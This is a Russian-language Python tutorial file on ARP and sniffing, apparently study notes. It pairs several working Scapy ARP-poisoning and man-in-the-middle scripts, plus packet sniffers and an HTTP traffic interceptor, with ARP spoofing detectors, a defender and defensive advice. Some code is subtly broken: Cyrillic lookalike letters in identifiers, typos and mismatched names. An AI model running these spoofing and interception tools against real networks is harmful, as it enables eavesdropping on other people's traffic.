# =====================================================================================================================================
# ARP (Address Resolution Protocol) - это протокол, который по­могает преобразовывать IР-адреса в физические МАС-адреса.
# Он важен для локальных сетей, так как помогает устройствам находить друг друга по физическим адресам, когда вы отправ­ляете данные по сети. 
# Если IР-адрес - это как почтовый адрес вашего друга, то МАС-адрес - это как его точный номер кварти­ры, чтобы письмо попало прямо к нему.
# ======================================================================================================================================

# Работа ARP: когда устройство в сети хочет отправить данные на дру­гой узел, оно использует ARP для определения МАС-адреса устройства по 
# его IР-адресу. Устройство отправляет АRР-запрос в широковещательном ре­жиме, и устройство с соответствующим IР-адресом отвечает своим МАС­
# адресом.

# IP - это протокол маршрутизации, который обеспечивает доставку пакетов данных между устройствами в сети. 
# Он отвечает за разделение данных на пакеты, их маршрутизацию и доставку к месту назначения.

# Версии IP: существует две основные версии IP: IPv4 и IPv6. IPv4 использует 32-битные адреса, 
# а 1Pv6 использует 128-битные адреса, что позволяет значительно увеличить количество уникальных IР-адресов.

# Использование статических АRР-записей. Настройка статических АRР-записей на ключевых устройствах сети может предотвратить АRР­ отравление, 
# так как эти записи не могут быть изменены динамически.

# Внедрение DHCP Snooping и Dynamic ARP Inspection. Эти методы могут использоваться на коммутаторах для проверки подлинности АRР­ 
# сообщений и предотвращения атак.

# Шифрование сетевого трафика. Использование протоколов, таких как SSL/TLS и IPsec, для шифрования данных, передаваемых по сети, 
# может защитить от сниффинга, так как перехваченные данные будут недоступ­ны для злоумышленника без ключа расшифровки.

# Мониторинг сети и системы обнаружения вторжений (IDS). Регуляр­ный мониторинг сетевого трафика и использование IDS могут помочь в 
# обнаружении и реагировании на подозрительную активность в сети.

# ============================================= АRР-отравление ==============================================================

# ARP (Address Resolution Protocol) - это протокол, используемый в компьютерных сетях для связи между устройствами на локальном уровне. 
# Он преобразует IР-адреса в МАС-адреса (и наоборот), чтобы устройства могли общаться друг с другом.

# Пример АRР-запроса и ответа:
# Запрос ARP:
# Кто имеет IР-адрес 192.168.0.1? (передается всем в сети)
# Ответ ARP:
# Устройство с IР-адресом 192.168.0.1 отвечает: у меня МАС-адрес
# 00:0a:95:9d:68:16.

# Пример реализации АRР-отравления с использованием библиотеки Scapy на языке Python:

# Пример реализации АRР-отравления
from scapy.all import *

# Указание целевого устройства и маршрутизатора
target_ip = "192.168.0.105"
gateway_ip = "192.168.0.1"

# Получение МАС-адресов целевого устройства и маршрутизатора
def get_mac(ip):
    ans, unans = arping(ip)
    for snt, rcv in ans:
        return rcv[Ether].src
target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

# Отправка ложных АRР-ответов
def spoof(target_ip, spoof_ip, target_mac):
    packet = ARP(op = 2, pdst = target_ip, psrc = spoof_ip, hwdst = target_mac)
    send(packet, verbose = False)
try:
    while True:
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, gateway_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print("Aтaкa прервана")
    sys.exit(0)

# АRР-отравления с использованием Python и Scapy
from scapy.all import ARP, Ether, sendp

# Создаем АRР-пакет для отр�вления
def craft_arp_packet(target_ip, target_mac, spoof_ip):
    arp = ARP(op = 2, pdst = target_ip, psrc = spoof_ip, hwdst = target_mac)
    ether = Ether(dst = target_mac)
    return ether / arp

# Отправляем отравленные АRР-паке.ты
def send_arp_packets(packet, count = 100):
    sendp(packet, count = count, verbose = False)

# Основная функция
def arp_poisoning(target_ip, target_mac, spoof_ip, count = 100):
    arp_packet_= craft_arp_packet(target_ip, target_mac, spoof_ip)
    send_arp_packets(arp_packet, count)

# Пример использования
if __name__ == "main":
    target_ip = "192.168.0.100" # IР-адрес целевого устройства
    target_mac = "AA:BB:CC:DD:EE:FF" # МАС-адрес целевого устройства
    spoof_ip = "192.168.0.1" # IР-адрес атакующего устройства
    arp_poisoning(target_ip, target_mac, spoof_ip)

# АRР-отравление с использованием библиотеки scapy
from scapy.all import ARP, Ether, seпd

# Создаем АRР-пакет с поддельными данными
arp_packet = Ether (dst = "ff:ff:ff:ff:ff:ff") / ARP (op = 2, pdst = "192.168.1.1", hwdst = "00:00:00:00:00:00")

# Отправляем АRР-пакет в сеть
seпd(arp_packet)

# =========================================================================================================================

# Установите scapy: pip install scapy
# Запустите с root-правами (требуется для отправки RAW-пакетов):
# sudo python3 arp_spoof.py 192.168.1.100 192.168.1.1 -i eth0
#!/usr/bin/env python3
import time
from scapy.all import ARP, Ether, sendp, getmacbyip

def arp_spoof(target_ip, spoof_ip, interface):
    """
    Отправляет поддельные ARP-ответы для перенаправления трафика
    
    :param target_ip: IP целевого устройства
    :param spoof_ip: IP, который мы подделываем
    :param interface: Сетевой интерфейс
    """
    target_mac = getmacbyip(target_ip)
    if target_mac is None:
        print(f"Не удалось получить MAC адрес для {target_ip}")
        return

    # Создаем поддельный ARP-пакет
    arp_response = ARP(pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, op = 'is-at')
    
    # Отправляем пакет
    sendp(arp_response, iface = interface, verbose = False)

def enable_ip_forwarding():
    """Включает IP-форвардинг для MITM"""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')

def disable_ip_forwarding():
    """Выключает IP-форвардинг"""
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('0')

def main():
    import argparse

    parser = argparse.ArgumentParser(description = 'ARP Spoofing Tool')
    parser.add_argument('target1', help = 'Первая жертва (IP)')
    parser.add_argument('target2', help = 'Вторая жертва (IP)')
    parser.add_argument('-i', '--interface', help = 'Сетевой интерфейс', required = True)
    args = parser.parse_args()

    print("[*] Включение IP-форвардинга...")
    enable_ip_forwarding()

    try:
        print("[*] Начало ARP-отравления. Нажмите Ctrl+C для остановки")
        while True:
            arp_spoof(args.target1, args.target2, args.interface)
            arp_spoof(args.target2, args.target1, args.interface)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Остановка ARP-отравления...")
    finally:
        disable_ip_forwarding()
        print("[*] IP-форвардинг выключен")

if __name__ == "__main__":
    main()

# ==================================================================================================================

# Как использовать:
# Сохраните скрипт как arp_spoof_detector.py

# Дайте права на выполнение: chmod +x arp_spoof_detector.py

# Запустите с правами root: sudo ./arp_spoof_detector.py

# Скрипт обнаружения ARP-отравления:
#!/usr/bin/env python3
import os
import re
import time
from collections import defaultdict

def get_arp_table():
    """Получает текущую ARP-таблицу"""
    arp_table = []
    with os.popen('arp -an') as f:
        for line in f:
            if re.match(r'.*\(.*\).*', line):
                ip = re.search(r'\((.*?)\)', line).group(1)
                mac = re.search(r'(([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))', line)
                mac = mac.group(1) if mac else None
                if ip and mac:
                    arp_table.append((ip, mac.lower()))
    return arp_table

def detect_arp_spoofing(interval = 10):
    """
    Обнаруживает ARP-отравление путем проверки дублирования MAC или IP адресов
    
    :param interval: Интервал проверки в секундах
    """
    ip_to_mac = defaultdict(set)
    mac_to_ip = defaultdict(set)
    
    print("[*] Запуск детектора ARP-отравления...")
    print("[*] Проверка ARP-таблицы каждые {} секунд\n".format(interval))
    
    try:
        while True:
            current_arp = get_arp_table()
            new_ip_to_mac = defaultdict(set)
            new_mac_to_ip = defaultdict(set)
            
            # Собираем новые данные
            for ip, mac in current_arp:
                new_ip_to_mac[ip].add(mac)
                new_mac_to_ip[mac].add(ip)
            
            # Проверяем конфликты
            conflicts = False
            
            # Проверка 1: Один IP привязан к нескольким MAC (ARP spoofing)
            for ip, macs in new_ip_to_mac.items():
                if len(macs) > 1:
                    print("[!] Обнаружен конфликт: IP {} привязан к нескольким MAC: {}".format(
                        ip, ", ".join(macs)))
                    conflicts = True
            
            # Проверка 2: Один MAC привязан к нескольким IP (возможен MITM)
            for mac, ips in new_mac_to_ip.items():
                if len(ips) > 1:
                    print("[!] Обнаружен конфликт: MAC {} привязан к нескольким IP: {}".format(
                        mac, ", ".join(ips)))
                    conflicts = True
            
            if not conflicts:
                print("[+] ARP-таблица чиста (конфликтов не обнаружено)")
            
            # Обновляем данные для следующей итерации
            ip_to_mac = new_ip_to_mac
            mac_to_ip = new_mac_to_ip
            
            time.sleep(interval)
    
    except KeyboardInterrupt:
        print("\n[*] Остановка детектора ARP-отравления...")

if __name__ == "__main__":
    detect_arp_spoofing()

# ===============================================================================================================================

# Как использовать:
# Установите зависимости: pip install scapy

# Запустите с правами root: sudo python3 arp_defender.py -i eth0 -g 192.168.1.1

#!/usr/bin/env python3
import os
import re
import time
import subprocess
from collections import defaultdict
from scapy.all import sniff, ARP, Ether, getmacbyip, sendp
from scapy.layers.l2 import getmacbyip

class ARPDefender:
    def __init__(self, interface, trusted_gateway_ip):
        self.interface = interface
        self.gateway_ip = trusted_gateway_ip
        self.trusted_macs = self._init_trusted_devices()
        self.arp_table = defaultdict(set)
        self.last_clean_time = time.time()
        
    def _init_trusted_devices(self):
        """Инициализирует список доверенных MAC-адресов"""
        trusted = {
            self.gateway_ip: getmacbyip(self.gateway_ip).lower()
        }
        
        # Можно добавить статические записи (IP:MAC) из конфига
        trusted.update({
            '192.168.1.100': 'aa:bb:cc:dd:ee:ff',
            '192.168.1.101': '11:22:33:44:55:66'
        })
        
        return trusted

    def get_current_arp(self):
        """Получает текущую ARP-таблицу"""
        arp_table = defaultdict(set)
        with os.popen('arp -an') as f:
            for line in f:
                if match := re.search(r'\((.*?)\).*?(([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))', line):
                    ip, mac = match.group(1), match.group(2).lower()
                    arp_table[ip].add(mac)
        return arp_table

    def validate_arp_entry(self, ip, mac):
        """Проверяет валидность ARP-записи"""
        # Проверка статических доверенных записей
        if ip in self.trusted_macs:
            if mac != self.trusted_macs[ip]:
                print(f"[CRITICAL] Подмена доверенного устройства! IP {ip} должен иметь MAC {self.trusted_macs[ip]}, но имеет {mac}")
                return False
        
        # Проверка дублирования MAC
        if len(self.arp_table[ip]) > 1:
            print(f"[WARNING] Обнаружен ARP-спуфинг: IP {ip} привязан к нескольким MAC: {', '.join(self.arp_table[ip])}")
            return False
            
        return True

    def block_mac(self, mac):
        """Блокирует MAC-адрес с помощью iptables"""
        if not self._is_mac_blocked(mac):
            print(f"[ACTION] Блокировка MAC {mac}")
            subprocess.run(['iptables', '-A', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'], check = True)
            subprocess.run(['iptables', '-A', 'OUTPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'], check = True)

    def _is_mac_blocked(self, mac):
        """Проверяет, заблокирован ли MAC"""
        result = subprocess.run(['iptables', '-L', '-n', '-v'], capture_output = True, text = True)
        return mac in result.stdout

    def restore_arp(self, ip, correct_mac):
        """Восстанавливает правильную ARP-запись"""
        print(f"[ACTION] Восстановление ARP для {ip} -> {correct_mac}")
        arp_response = ARP(pdst = ip, hwdst = 'ff:ff:ff:ff:ff:ff', psrc = ip, hwsrc = correct_mac, op = 'is-at')
        sendp(arp_response, iface = self.interface, verbose = False)

    def arp_monitor_callback(self, pkt):
        """Обработчик ARP-пакетов"""
        if ARP in pkt and pkt[ARP].op == 2:  # ARP-ответ
            ip, mac = pkt[ARP].psrc, pkt[ARP].hwsrc.lower()
            
            # Обновляем ARP-таблицу
            self.arp_table[ip].add(mac)
            
            # Проверяем на аномалии
            if not self.validate_arp_entry(ip, mac):
                self.block_mac(mac)
                if ip in self.trusted_macs:
                    self.restore_arp(ip, self.trusted_macs[ip])

    def periodic_cleanup(self):
        """Периодическая очистка старых записей"""
        current_time = time.time()
        if current_time - self.last_clean_time > 60:  # Каждую минуту
            self.arp_table = self.get_current_arp()
            self.last_clean_time = current_time

    def start(self):
        """Запускает защиту"""
        print(f"[*] Запуск ARP Defender на интерфейсе {self.interface}")
        print(f"[*] Доверенный шлюз: {self.gateway_ip} -> {self.trusted_macs[self.gateway_ip]}")
        
        # Включение защиты от ARP-спуфинга в ядре
        with open('/proc/sys/net/ipv4/conf/all/arp_ignore', 'w') as f:
            f.write('1')
        with open('/proc/sys/net/ipv4/conf/all/arp_announce', 'w') as f:
            f.write('2')
        
        try:
            # Запуск сниффера в фоне
            sniff(prn = self.arp_monitor_callback, filter = 'arp', store = 0, iface = self.interface)
            
            while True:
                self.periodic_cleanup()
                time.sleep(5)
                
        except KeyboardInterrupt:
            print("\n[*] Остановка ARP Defender...")
        finally:
            # Восстановление настроек ядра
            with open('/proc/sys/net/ipv4/conf/all/arp_ignore', 'w') as f:
                f.write('0')
            with open('/proc/sys/net/ipv4/conf/all/arp_announce', 'w') as f:
                f.write('0')

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description = 'ARP Spoofing Defender')
    parser.add_argument('-i', '--interface', required = True, help = 'Сетевой интерфейс')
    parser.add_argument('-g', '--gateway', required = True, help = 'IP доверенного шлюза')
    
    args = parser.parse_args()
    
    defender = ARPDefender(interface = args.interface, trusted_gateway_ip = args.gateway)
    defender.start()

# Добавьте статические ARP-записи для критичных устройств:
self.trusted_macs.update({
    '192.168.1.2': '00:11:22:33:44:55',
    '192.168.1.3': 'aa:bb:cc:dd:ee:ff'
})

# Для усиленной защиты можно добавить:
# Включение arp_validate
with open('/proc/sys/net/ipv4/conf/all/arp_filter', 'w') as f:
    f.write('1')

# Отключение proxy_arp
with open('/proc/sys/net/ipv4/conf/all/proxy_arp', 'w') as f:
    f.write('0')

# =========================================================================================================================================

# Как использовать:
# Установите scapy: pip install scapy

# Запустите с правами root: sudo python3 arp_scanner.py

#!/usr/bin/env python3
from scapy.all import ARP, Ether, srp, conf
import ipaddress
import socket
import struct
import re
import time

class NetworkScanner:
    def __init__(self, interface = None, timeout = 2):
        self.interface = interface or conf.iface
        self.timeout = timeout
        self.results = []

    def get_local_network(self):
        """Определяет локальную сеть на основе IP и маски интерфейса"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
            
            with open(f"/proc/net/route") as f:
                for line in f.readlines()[1:]:
                    parts = line.strip().split()
                    if parts[1] == '00000000' and parts[7] == '00000000':
                        netmask = socket.inet_ntoa(struct.pack('<L', int(parts[7], 16)))
                        break
                else:
                    netmask = '255.255.255.0'
            
            network = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict = False)
            return str(network.network_address), str(network.netmask)
        
        except Exception as e:
            print(f"[!] Ошибка определения сети: {e}")
            return None, None

    def arp_scan(self, ip_range = None):
        """Выполняет ARP-сканирование сети"""
        if not ip_range:
            network, netmask = self.get_local_network()
            if not network:
                print("[!] Не удалось определить сеть для сканирования")
                return
            
            ip_range = f"{network}/{netmask}"
            print(f"[*] Сканирование сети: {ip_range}")

        print(f"[*] Начало ARP-сканирования на интерфейсе {self.interface}...")
        start_time = time.time()

        # Создаем ARP-запрос
        arp = ARP(pdst = ip_range)
        ether = Ether(dst = "ff:ff:ff:ff:ff:ff")
        packet = ether / arp

        try:
            # Отправляем пакеты и получаем ответы
            answered, _ = srp(packet, timeout = self.timeout, iface = self.interface, verbose = False)
            
            self.results = []
            for sent, received in answered:
                self.results.append({'ip': received.psrc, 'mac': received.hwsrc})
            
            duration = time.time() - start_time
            print(f"[+] Сканирование завершено за {duration:.2f} секунд")
            print(f"[+] Найдено устройств: {len(self.results)}")
            
        except PermissionError:
            print("[!] Ошибка: Требуются права root/sudo")
        except Exception as e:
            print(f"[!] Ошибка сканирования: {e}")

    def print_results(self):
        """Выводит результаты сканирования"""
        if not self.results:
            print("[-] Активные устройства не обнаружены")
            return

        print("\nРезультаты сканирования:")
        print("IP-адрес".ljust(16), "MAC-адрес".ljust(18), "Производитель")
        print("-" * 50)
        
        for device in sorted(self.results, key = lambda x: ipaddress.IPv4Address(x['ip'])):
            vendor = self.get_mac_vendor(device['mac'])
            print(device['ip'].ljust(16), device['mac'].ljust(18), vendor)

    def get_mac_vendor(self, mac):
        """Определяет производителя по MAC (OUI)"""
        try:
            from scapy.all import manuf
            return manuf.manuf._get_manuf(mac)
        except:
            return "Неизвестно"

    def save_results(self, filename = "network_scan.txt"):
        """Сохраняет результаты в файл"""
        with open(filename, 'w') as f:
            f.write("Результаты сканирования сети\n")
            f.write(f"Время: {time.ctime()}\n\n")
            f.write("IP-адрес".ljust(16) + "MAC-адрес".ljust(18) + "Производитель\n")
            f.write("-" * 50 + "\n")
            
            for device in sorted(self.results, key=lambda x: ipaddress.IPv4Address(x['ip'])):
                vendor = self.get_mac_vendor(device['mac'])
                f.write(f"{device['ip'].ljust(16)}{device['mac'].ljust(18)}{vendor}\n")
        
        print(f"[+] Результаты сохранены в {filename}")

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description = 'ARP Network Scanner')
    parser.add_argument('-i', '--interface', help = 'Сетевой интерфейс')
    parser.add_argument('-r', '--range', help = 'Диапазон IP для сканирования (например, 192.168.1.0/24)')
    parser.add_argument('-t', '--timeout', type = int, default = 2, help = 'Таймаут ожидания ответа')
    parser.add_argument('-o', '--output', help = 'Файл для сохранения результатов')
    
    args = parser.parse_args()

    scanner = NetworkScanner(interface = args.interface, timeout = args.timeout)
    scanner.arp_scan(args.range)
    scanner.print_results()
    
    if args.output:
        scanner.save_results(args.output)

# Сканирование автоматически определенной сети: sudo python3 arp_scanner.py -i eth0
# Сканирование конкретной подсети: sudo python3 arp_scanner.py -r 192.168.1.0/24
# Сохранение результатов в файл: sudo python3 arp_scanner.py -o scan_results.txt

# =============================================== Сниффинг трафика ===================================================

# Захват пакетов, Сниффер перехватывает пакеты данных, проходящие через сеть. 
# Это включает пакеты, отправляемые и получаемые различ­ными устройствами в локальной сети, а также те, 
# которые пересылаются через сетевые шлюзы и маршрутизаторы. Для захвата пакетов могут ис­пользоваться инструменты и библиотеки, 
# такие как Wireshark, tcpdump или Scapy.

# Анализ пакетов. После захвата пакетов сниффер анализирует их содер­жимое. Анализ включает просмотр заголовков пакетов, 
# полезной нагруз­ки (payload) и других метадан_ных, которые могут содержать информа­цию о протоколах, портах, IР-адресах, МАС-адресах и т.д. 
# Это помогает понять структуру и содержание пакетов.

# Идентификация протоколов. Сниффер определяет типы сетевых про­токолов, используемых в захваченных пакетах. 
# Это позволяет интерпре­тировать данные правильно и распознавать команды, запросы и ответы в соответствии с соответствующими протоколами. 
# Например, идентифи­цировать НТТР, HTTPS, FTP, DNS и другие протоколы.

# Wireshark - это один из самых популярных инструментов для захвата и анализа сетевых пакетов. 
# Он предоставляет графический интерфейс для просмотра содержимого пакетов и детального анализа сетевого трафика.

# tcpdump- это-мощный инструмент командной строки для захвата и ана­лиза сетевых пакетов. 
# Он позволяет фильтровать захваченные пакеты по различным критериям и сохранять их в файлы для дальнейшего анализа.

# Scapy - это библиотека на Python для создания, отправки, захвата и ана­лиза сетевых пакетов. 
# Она предоставляет гибкий интерфейс для работы с различными протоколами и позволяет автоматизировать задачи сниф­финга.

# Использование Scapy для захвата и анализа пакетов:
from scapy.all import sniff

# Функция для обработки захваченных пакетов
def packet_handler(packet):
    print(packet.show())
# Захват пакетов
sniff(filter = "ip", prn = packet_handler, count = 10)


# Использование Scapy для создания и отправки пакетов:
from scapy.all import *

# Создание и отправка ICMP пакета (ping)
packet = IP(dst = "B.8.8.8") / ICMP()
send(packet)

# Сниффинг трафика на языке программирования Python можно реализо­вать с использованием различных библиотек, таких как Scapy, Pyshark или Socket.

from scapy.all import *

def packet_callback(packet):
    print(packet.show())

# Запуск сниффера
sniff(prn = packet_callback, count = 10)
# Этот код перехватывает 1 О пакетов и выводит их содержимое с использо­ванием функции packet_callback.

# Pyshark - это Руthоn-обертка для tshark, сетевого анализатора из набора инструментов Wireshark. 
# Она позволяет перехватывать и анализировать се­тевой трафик.

import pyshark

capture = pyshark.LiveCapture(interface = 'eth0')
for packet in capture.sniff_continuously(packet_count = 5):
    print(packet)
# Этот код перехватывает 5 пакетов на сетевом интерфейсе eth0 и выводит их содержимое.

# Библиотека Socket позволяет работать на низком уровне с сетевыми соединениями.
import socket

def sniffing ():
    conn = socket.socket(socket.AF__PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    while True:
        raw_data, addr = conn.recvfrom(65536)
        print(raw_data)
sniffing()

# Пример простой реализации сниффера с использованием библиотеки Scapy
from scapy.all import sniff

# Обработчик захваченных пакетов
def packet_handler(packet):
    # Вывод информации о захваченном пакете
    print(packet.summary())

# Функция для запуска сниффера
def start_sniffing(interface, filter = None):
    # Запуск сниффера с указанным интерфейсом и фильтром
    sniff(iface = interface, filter = filter, prn = packet_handler)

# Пример использования
if __name__ == "main":
    interface = "eth0" # Интерфейс , !"!а котором будет происходить сниффинг
    filter = "tcp port 80" # Фильтр для захвата только НТТР­ трафика
    start_sniffing(interface, filter)

# В этом примере используется функция sniff() из библиотеки Scapy для захвата сетевого трафика. 
# Функция принимает несколько параметров, вклю­чая интерфейс, на котором будет происходить сниффинг (iface), 
# фильтр для захвата определенного типа трафика (filter) и функцию-обработчик пакетов (prn).

# Когда сниффер захватывает пакеты, они передаются в функцию-обработ­чик packet_handler(), которая выводит краткую информацию о захваченном пакете.
# Затем функция start_sniffing() запускает сниффер с указанными параме­трами, такими как интерфейс и фильтр. 
# В данном примере сниффер настро­ен на захват НТТР-трафика на указанном интерфейсе.

# =====================================================================================================================================

# Код сниффера (Python + Scapy)
#!/usr/bin/env python3
from scapy.all import sniff, IP, TCP, UDP, Ether, ARP
import argparse
from datetime import datetime

def packet_callback(packet):
    """Обработчик каждого перехваченного пакета"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Ethernet-кадр (MAC-адреса)
    if Ether in packet:
        src_mac = packet[Ether].src
        dst_mac = packet[Ether].dst
        print(f"\n[📦] Ethernet: {src_mac} -> {dst_mac}")

    # ARP-запросы
    if ARP in packet:
        print(f"[🔎] ARP: {packet[ARP].psrc} is at {packet[ARP].hwsrc}")

    # IP-пакеты
    if IP in packet:
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        proto = packet[IP].proto
        print(f"[🌐] IP: {src_ip} -> {dst_ip} | Proto: {proto}")

        # TCP
        if TCP in packet:
            src_port = packet[TCP].sport
            dst_port = packet[TCP].dport
            print(f"[🔌] TCP: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
            if packet[TCP].payload:
                payload = str(packet[TCP].payload)[:100]  # Первые 100 символов
                print(f"[📝] Payload: {payload}")

        # UDP
        elif UDP in packet:
            src_port = packet[UDP].sport
            dst_port = packet[UDP].dport
            print(f"[🔌] UDP: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")

def main():
    parser = argparse.ArgumentParser(description = "📡 Сниффер сетевого трафика")
    parser.add_argument("-i", "--interface", help = "Сетевой интерфейс (например, eth0, wlan0)", required = True)
    parser.add_argument("-f", "--filter", help = "Фильтр BPF (например, 'tcp port 80')", default = "")
    args = parser.parse_args()

    print(f"[🚀] Запуск сниффера на интерфейсе {args.interface}... (Ctrl+C для остановки)")
    try:
        sniff(iface = args.interface, filter = args.filter, prn = packet_callback, store = 0)
    except KeyboardInterrupt:
        print("\n[🛑] Сниффинг остановлен.")

if __name__ == "__main__":
    main()

# Установите scapy: pip install scapy
# Запустите сниффер (требуются права root): sudo python3 sniffer.py -i eth0
# Фильтрация трафика (например, только HTTP-трафик): sudo python3 sniffer.py -i eth0 -f "tcp port 80"

# Сохранение в файл (.pcap):
sniff(..., store = True, offline = "capture.pcap")

# Анализ DNS-запросов:
from scapy.layers.dns import DNS
if DNS in packet:
    print(f"[DNS] Запрос: {packet[DNS].qd.qname}")

# ======================================================================================================================================

# Код скрипта (Python + Scapy)
#!/usr/bin/env python3
from scapy.all import sniff, ARP, Ether, getmacbyip
from collections import defaultdict
import time
import smtplib
from email.mime.text import MIMEText
import argparse

class ARPMonitor:
    def __init__(self, interface, alert_email = None):
        self.interface = interface
        self.alert_email = alert_email
        self.arp_table = defaultdict(set)  # {ip: set(mac1, mac2, ...)}
        self.mac_to_ip = defaultdict(set)  # {mac: set(ip1, ip2, ...)}
        self.trusted_devices = {}  # {"192.168.1.1": "aa:bb:cc:dd:ee:ff"}

    def log_alert(self, message):
        """Логирование и отправка уведомлений"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        log_msg = f"[ALERT][{timestamp}] {message}"
        print(log_msg)
        
        if self.alert_email:
            self.send_email_alert(log_msg)

    def send_email_alert(self, message):
        """Отправка email (требуется настройка SMTP)"""
        try:
            msg = MIMEText(message)
            msg["Subject"] = "⚠️ Обнаружена MITM-атака в сети!"
            msg["From"] = "arp_monitor@example.com"
            msg["To"] = self.alert_email
            
            with smtplib.SMTP("smtp.example.com", 587) as server:
                server.starttls()
                server.login("user@example.com", "password")
                server.send_message(msg)
        except Exception as e:
            print(f"[!] Ошибка отправки email: {e}")

    def arp_callback(self, packet):
        """Обработчик ARP-пакетов"""
        if ARP in packet and packet[ARP].op == 2:  # ARP-ответ (is-at)
            ip = packet[ARP].psrc
            mac = packet[ARP].hwsrc.lower()
            
            # Проверка доверенных устройств
            if ip in self.trusted_devices:
                if mac != self.trusted_devices[ip]:
                    self.log_alert(f"Подмена доверенного IP! {ip} должен быть {self.trusted_devices[ip]}, но обнаружен {mac}")
            
            # Обновляем ARP-таблицу
            self.arp_table[ip].add(mac)
            self.mac_to_ip[mac].add(ip)
            
            # Проверка аномалий
            if len(self.arp_table[ip]) > 1:
                self.log_alert(f"Обнаружен ARP Spoofing! IP {ip} имеет несколько MAC: {self.arp_table[ip]}")
            
            if len(self.mac_to_ip[mac]) > 1:
                self.log_alert(f"Подозрительный MAC! {mac} используется для IP: {self.mac_to_ip[mac]}")

    def start(self):
        """Запуск мониторинга"""
        print(f"[*] Запуск ARP-монитора на интерфейсе {self.interface}...")
        print("[*] Нажмите Ctrl+C для остановки\n")
        
        try:
            sniff(iface = self.interface, filter = "arp", prn = self.arp_callback, store = 0)
        except KeyboardInterrupt:
            print("\n[!] Мониторинг остановлен.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description = "🛡️ Детектор MITM-атак (ARP Spoofing)")
    parser.add_argument("-i", "--interface", required = True, help = "Сетевой интерфейс (например, eth0)")
    parser.add_argument("-e", "--email", help = "Email для уведомлений (опционально)")
    args = parser.parse_args()

    monitor = ARPMonitor(interface = args.interface, alert_email = args.email)
    
    # Добавление доверенных устройств (например, роутер)
    monitor.trusted_devices = {
        "192.168.1.1": "aa:bb:cc:dd:ee:ff"  # Замените на реальный MAC роутера
    }
    
    monitor.start()

# Установите зависимости: pip install scapy
# Запустите скрипт (требуются права root): sudo python3 arp_monitor.py -i eth0
# Уведомления на email: sudo python3 arp_monitor.py -i eth0 -e your_email@example.com

# Сохранение логов в файл:
with open("arp_alerts.log", "a") as f:
    f.write(log_msg + "\n")

# =============================================================================================================================

# Утилита для перехвата и анализа HTTP-трафика
import argparse
import pyshark
from colorama import init, Fore
from datetime import datetime

init()  # Инициализация colorama для цветного вывода

class HTTPTrafficAnalyzer:
    def __init__(self, interface, output_file = None, filter_expr = None):
        self.interface = interface
        self.output_file = output_file
        self.filter_expr = filter_expr or "http"
        self.capture = None
        self.packet_count = 0

    def start_capture(self):
        """Начать перехват трафика"""
        print(f"{Fore.GREEN}[*] Начало перехвата трафика на интерфейсе {self.interface}{Fore.RESET}")
        try:
            self.capture = pyshark.LiveCapture(
                interface = self.interface,
                display_filter = self.filter_expr,
                output_file = self.output_file
            )
            
            # Обработка каждого пакета
            self.capture.apply_on_packets(self.process_packet)
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Перехват остановлен пользователем{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[!] Ошибка: {e}{Fore.RESET}")

    def process_packet(self, packet):
        """Обработать HTTP пакет"""
        self.packet_count += 1
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        try:
            if hasattr(packet, 'http'):
                http_layer = packet.http
                ip_layer = packet.ip
                transport_layer = packet.tcp if hasattr(packet, 'tcp') else packet.udp
                
                print(f"\n{Fore.CYAN}=== Пакет #{self.packet_count} [{timestamp}] ==={Fore.RESET}")
                print(f"{Fore.BLUE}Источник: {ip_layer.src}:{transport_layer.srcport}")
                print(f"Назначение: {ip_layer.dst}:{transport_layer.dstport}{Fore.RESET}")
                
                # Обработка HTTP-запроса
                if hasattr(http_layer, 'request_method'):
                    self.process_http_request(http_layer)
                
                # Обработка HTTP-ответа
                if hasattr(http_layer, 'response_code'):
                    self.process_http_response(http_layer)
                
                # Дополнительная информация
                if hasattr(http_layer, 'file_data'):
                    print(f"{Fore.MAGENTA}Содержимое:{Fore.RESET}")
                    print(http_layer.file_data)
                
                print(f"{Fore.CYAN}=== Конец пакета ==={Fore.RESET}\n")
                
        except AttributeError as e:
            print(f"{Fore.YELLOW}[!] Не удалось обработать пакет: {e}{Fore.RESET}")

    def process_http_request(self, http_layer):
        """Обработать HTTP-запрос"""
        print(f"{Fore.GREEN}>>> HTTP ЗАПРОС <<<{Fore.RESET}")
        print(f"Метод: {http_layer.request_method}")
        print(f"URL: {http_layer.host}{http_layer.request_uri}")
        print(f"Версия HTTP: {http_layer.request_version}")
        
        if hasattr(http_layer, 'request_headers'):
            print(f"{Fore.YELLOW}Заголовки запроса:{Fore.RESET}")
            headers = self.parse_headers(http_layer.request_headers)
            for name, value in headers.items():
                print(f"  {name}: {value}")

    def process_http_response(self, http_layer):
        """Обработать HTTP-ответ"""
        print(f"{Fore.GREEN}>>> HTTP ОТВЕТ <<<{Fore.RESET}")
        print(f"Код ответа: {http_layer.response_code}")
        print(f"Фраза: {http_layer.response_phrase}")
        print(f"Версия HTTP: {http_layer.response_version}")
        
        if hasattr(http_layer, 'response_headers'):
            print(f"{Fore.YELLOW}Заголовки ответа:{Fore.RESET}")
